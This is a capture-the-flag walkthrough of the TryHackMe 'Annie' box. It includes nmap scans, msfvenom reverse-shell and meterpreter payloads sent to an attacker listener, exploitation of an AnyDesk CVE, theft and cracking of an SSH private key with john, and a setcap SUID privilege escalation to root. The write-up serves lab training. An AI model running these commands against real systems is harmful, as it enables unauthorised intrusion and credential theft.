---
title: Box - Annie
published: true
---

TryHackMe CTF Box - Remote access comes in different flavors.

[https://tryhackme.com/room/annie](https://tryhackme.com/room/annie)

![0xskar](/assets/annie01.webp)

* * *

## Recon - Research - Exploit 

##   Nmap Scans

- ``sudo nmap -Pn -sS -p- 10.10.7.95 -vvv``
- ``sudo nmap -sC -sV -O 10.10.7.95 -p22,7070,38491,42043``

- We can see ssh and "realserver" are open

* * * 

## Anydesk Client

```shell
PORT     STATE SERVICE         VERSION
7070/tcp open  ssl/realserver?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AnyDesk Client
```

- [CVE-2020-13160](https://www.exploit-db.com/exploits/49613)

1. ``msfvenom -p linux/x64/shell_reverse_tcp LHOST=ip LPORT=7777 -b "\x00\x25\x26" -f python -v shellcode``
2. inset into payload and setup ``nc -nvlp 7777``

![0xskar](/assets/annie02.png)

* * * 

## PrivESC

1. upgrade shell ``python3 -c 'import pty; pty.spawn("/bin/bash")'``
2. setup more stable staged meterpreter shell and wget it over ``msfvenom -p linux/x64/meterpreter/reverse_tcp  LHOST=10.x.x.x LPORT=5555 -f elf > meterpreter.elf``
3. ``msfconsole use exploit/multi/handler`` & ``set payload linux/x64/meterpreter/reverse_tcp``
4. annie has id_rsa keys available in her home lets download in metasploit and then feed them to john
5. ``ssh2john id_rsa > anniejohn``
6. ``john anniejohn --wordlist=/usr/share/seclists/Passwords/rockyou.txt``

![annie123](/assets/annie03.png)

Now that we have annie ssh to make things easiar we can login there and continue with privesc

1. linpeas.sh
2. https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/

```shell
-rwsr-xr-x 1 root root 10K Nov 16  2017 /sbin/setcap (Unknown SUID binary)
```

setcap allows us to set special permissions on files allowing us to privesc. Is we set cap_setuid+ep into a binary it can lead to privilege escalation. See the process in below pic.

![0xskar](/assets/annie04.png)

1. We check permissions on python3 as we can use that to spawn a root shell with SUID
2. It doesnt have the special permission so we can copy it from its directory to annies and setcap cap_setuid+ep and spawn a shell.

* * * 

